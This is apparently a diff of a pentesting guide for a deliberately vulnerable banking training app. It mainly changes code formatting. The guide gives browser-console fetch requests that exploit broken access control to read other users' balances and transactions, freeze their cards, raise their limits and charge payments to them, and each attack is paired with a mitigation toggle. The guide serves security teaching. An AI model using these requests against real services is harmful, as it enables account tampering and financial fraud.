@@ -11,7 +11,8 @@ Browser access to functioning web app and two registered user accounts, at least
 Complete setup of at least one VC is necessary for pentesting. Should none be available, please [reset the database](../README.md#resetting-the-database). Should that not be an option, or should you prefer a different balance, take the following steps:
 1. Create VC via web app UI. Set the limit to 1000.
 2. Open the browser console and execute the following command:
-    `const token = localStorage.getItem('jwt_token');
+
+    ```const token = localStorage.getItem('jwt_token');
     fetch('/api/virtual-cards/<vc_num>/update-limit', {
         method: 'POST',
         headers: {
@@ -23,7 +24,7 @@ Complete setup of at least one VC is necessary for pentesting. Should none be av
         })
     })
     .then(r => r.json())
-    .then(console.log);`
+    .then(console.log);
 <vc_num> should be `1` if this instance of the web app is fresh and the VC added above is the first and only. `current_balance` may be any value between 0 and the card's limit.
 
 3. Refresh the page, scroll down, and confirm VC balance if desired.
@@ -45,10 +46,10 @@ From here, this may be exploited in one of two ways:
 ##### via CLI
 3. Open the browser console/terminal.
 4. Issue the following fetch request as a command, replacing `<ACCOUNT_NUMBER>` with the previously noted account number:
-    `const attackerToken = localStorage.getItem('jwt_token');
+    ```const attackerToken = localStorage.getItem('jwt_token');
     fetch('/check_balance/' + '<ACCOUNT_NUMBER>', {
     headers: { Authorization: 'Bearer ' + attackerToken }
-    }).then(r => r.json()).then(console.log);`
+    }).then(r => r.json()).then(console.log);
 5. Observe outcome.
 ![alt text](./screenshots/image.png)
 
@@ -66,10 +67,10 @@ Initial steps are identical to those above: log in, note account number, log out
 ##### via CLI
 1. Open the browser console/terminal.
 2. Issue the following fetch request as a command -- replacing `<ACCOUNT_NUMBER>` with the previously noted account number -- and observe outcome:
-    `const attackerToken = localStorage.getItem('jwt_token');
+   ```const attackerToken = localStorage.getItem('jwt_token');
     fetch('/transactions/' + '<ACCOUNT_NUMBER>', {
     headers: { Authorization: 'Bearer ' + attackerToken }
-    }).then(r => r.json()).then(console.log);`
+    }).then(r => r.json()).then(console.log);
 #### Mitigate
 Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack (either sequence of steps above) and observe outcome:
 ![alt text](./screenshots/image-4.png)
@@ -80,11 +81,11 @@ Allows attacker to freeze or unfreeze any user's virtual card.
 1. Log in as any user and open browser console.
 2. Issue the following fetch request as a command -- replacing <vc_num> with the virtual card ID of any <em>other</em> user -- and observe outcome:
 
-    `const attackerToken = localStorage.getItem('jwt_token');
+    ```const attackerToken = localStorage.getItem('jwt_token');
     fetch('/api/virtual-cards/' + <vc_num> + '/toggle-freeze', {
     method: 'POST',
     headers: { Authorization: 'Bearer ' + attackerToken }
-    }).then(r => r.json()).then(console.log);`
+    }).then(r => r.json()).then(console.log);
 ![alt text](./screenshots/image-5.png)
 #### Mitigate
 Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack and observe outcome:
@@ -96,10 +97,10 @@ Grants attacker access to a collection of transactions related to any virtual ca
 1. Log in as any user and open browser console.
 2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:
 
-    `fetch('/api/virtual-cards/' + <vc_num> + '/transactions', {
+    ```fetch('/api/virtual-cards/' + <vc_num> + '/transactions', {
     method: 'GET',
     headers: { Authorization: 'Bearer ' + localStorage.getItem('jwt_token') }
-    }).then(r => r.json()).then(console.log);`
+    }).then(r => r.json()).then(console.log);
 
 ![alt text](./screenshots/image-8.png)
 
@@ -113,14 +114,14 @@ Allows attacker to update the limit on any virtual card belonging to any user.
 1. Log in as any user and open the browser console.
 2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:
 
-    `fetch('/api/virtual-cards/<vc_num>/update-limit', {
+    ```fetch('/api/virtual-cards/<vc_num>/update-limit', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
     },
     body: JSON.stringify({ card_limit: 50000 })
-    }).then(r => r.json()).then(console.log);`
+    }).then(r => r.json()).then(console.log);
 
 ![alt text](./screenshots/image-10.png)
 
@@ -134,7 +135,7 @@ Allows attacker to create a payment on the balance of any card belonging to any 
 1. Log in as any user and open the browser console.
 2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:
 
-    `const attackerToken = localStorage.getItem('jwt_token');
+    ```const attackerToken = localStorage.getItem('jwt_token');
     fetch('/api/bill-payments/create', {
     method: 'POST',
     headers: {
@@ -148,7 +149,7 @@ Allows attacker to create a payment on the balance of any card belonging to any 
         card_id: <vc_num>,
         description: 'test' // Can be any string
     })
-    }).then(r => r.json()).then(console.log);`
+    }).then(r => r.json()).then(console.log);
 
 ![alt text](./screenshots/image-12.png)
 
